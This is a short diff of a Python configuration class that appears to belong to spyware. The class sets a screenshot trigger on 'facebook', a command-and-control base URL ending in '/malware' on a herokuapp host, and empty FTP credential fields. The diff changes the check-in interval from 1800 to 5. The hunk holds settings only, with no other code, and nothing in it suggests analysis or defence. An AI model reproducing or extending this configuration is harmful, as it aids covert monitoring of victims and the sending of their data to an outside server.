@@ -64,7 +64,7 @@ class Configuration:
             self.__screenshotFrequency = 50
             self.__screenshotTrigger = 'facebook'
             self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
-            self.__communicationFrequency = 1800
+            self.__communicationFrequency = 5
             self.__ftpURL = None
             self.__ftpUserName = None
             self.__ftpPassword = None
